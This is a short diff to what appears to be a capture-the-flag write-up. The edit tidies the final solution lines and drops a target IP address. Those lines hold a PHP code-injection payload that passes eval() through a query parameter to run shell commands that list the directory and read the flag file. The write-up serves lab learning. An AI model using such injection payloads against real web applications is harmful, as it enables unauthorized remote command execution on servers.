@@ -6,5 +6,6 @@ https://www.programmersought.com/article/30723400042/
 
 I still spent some time trying to find correct way to display the flag. In the end query that worked was:
 
-`?format=${eval($_GET[1])}&1=echo%20exec(%27ls%20-l%20..%20|grep%20flag%27);` - to find flag file name
-`http://138.68.158.236:31766/?format=${eval($_GET[1])}&1=echo%20exec(%27cat%20../flagmR6OV%27);` - to display the flag
+`?format=${eval($_GET[1])}&1=echo%20exec(%27ls%20-l%20..%20|grep%20flag%27);` - to find the flag file name
+
+`?format=${eval($_GET[1])}&1=echo%20exec(%27cat%20../flagmR6OV%27);` - to display the flag
